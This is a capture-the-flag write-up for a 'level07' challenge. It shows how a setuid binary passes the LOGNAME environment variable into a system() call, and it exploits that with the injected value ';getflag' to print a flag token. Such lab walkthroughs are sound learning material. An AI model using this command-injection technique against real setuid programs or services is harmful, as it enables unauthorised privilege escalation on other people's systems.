# Level 07

As `level07`, running `ls` gives us a binary called `level07` inside our home folder. Using `ltrace` on it gives us the following...

```shell
  $> ltrace ./level07 
  __libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
  getegid()                                                            = 2007      
  geteuid()                                                            = 2007      
  setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                  = 0
  setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                  = 0
  getenv("LOGNAME")                                                    = "level07" 
  asprintf(0xbffff744, 0x8048688, 0xbfffff47, 0xb7e5ee55, 0xb7fed280)  = 18        
  system("/bin/echo level07 "level07
  <unfinished ...>
  --- SIGCHLD (Child exited) ---
  <... system resumed> )                                               = 0
  +++ exited (status 0) +++
```

> This binary checks for UID and GID of the user running it, then retrieves an environment variable: `LOGNAME` before outputing it via a `system` call.

So in order to exploit this binary, we simply have to modify what's inside `LOGNAME`. If we checks for more details with `ls -l`:

```shell
  $> ls -l
  total 12
  -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Once again, the binary is owned by `flag07` which has the right to use `getflag`. Escaping `echo` and calling `getflag` would give us the flag.

```shell
  $> export LOGNAME=";getflag" && ./level07 

  Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

So, `fiumuikeil55xe9cu4dood66h` is the flag for this level.
